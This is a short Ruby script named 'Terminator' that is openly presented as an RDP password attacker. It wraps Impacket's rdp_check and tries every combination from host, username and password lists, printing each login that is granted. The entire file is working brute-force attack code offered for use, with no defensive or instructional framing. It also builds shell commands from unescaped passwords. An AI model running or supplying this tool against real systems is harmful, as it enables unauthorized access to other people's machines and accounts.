#!/usr/bin/env ruby
#Terminator is an RDP attack tool which wraps Impackets rdp_check.

require 'trollop'
require 'colorize'
require 'logger'
require 'tty-command'

log         = Logger.new('debug.log')
@cmd        = TTY::Command.new(output: log)
@tooldir    = File.expand_path(File.dirname(__FILE__))
@rdp_check  = "#{@tooldir}/rdp_check.py"

def arguments
  @opts = Trollop::options do
    version "terminator 0.1".light_blue
    banner <<-EOS
    RDP Password Attacker
    EOS

    opt :host,   "Provide a single host at the command line - host:port", :type => String, :short => "-h"
    opt :hosts,  "Provide a list of hosts", :type => String, :short => "-H"
    opt :user,   "Provide a username",  :type => String, :short => "-u"
    opt :users,  "Provide a list of usernames",  :type => String, :short => "-U"
    opt :pass,   "Provide a password",  :type => String, :short => "-p"
    opt :passes, "Provide a list of passwords",  :type => String, :short => "-P"
    opt :domain, "Domain or workgroup", :short => "-d",  :default => "WORKGROUP"

    if ARGV.empty?
      puts "Try ./terminator.rb --help"
    end
  end
  @opts
end

def hostlist
  if @opts[:hosts]
    hosts = File.readlines(@opts[:hosts]).map(&:chomp &&:strip)
  else
    hosts = [@opts[:host].to_s]
  end
end

def userlist
  if @opts[:users]
    users = File.readlines(@opts[:users]).map(&:chomp &&:strip)
  else
    users = [@opts[:user].to_s]
  end
end

def passlist
  if @opts[:passes]
    passwords = File.readlines(@opts[:passes]).map(&:chomp &&:strip)
  else
    passwords = [@opts[:pass].to_s]
  end
end

def rdp_attack
  hostlist.each do |host|
    userlist.each do |user|
      passlist.each do |pass|
        out, err = @cmd.run!("#{@rdp_check} #{@opts[:domain]}/#{user}:'#{pass}'@#{host}")
        status = out.split("\n\n")[1]
        if status =~ /Access Granted/
          puts "[*]#{host}:#{user}:#{pass} - SUCCESS".green.bold
        else
          puts "[-]#{host}:#{user}:#{pass} - FAILED".red.bold
        end
      end
    end
  end
end

arguments
rdp_attack
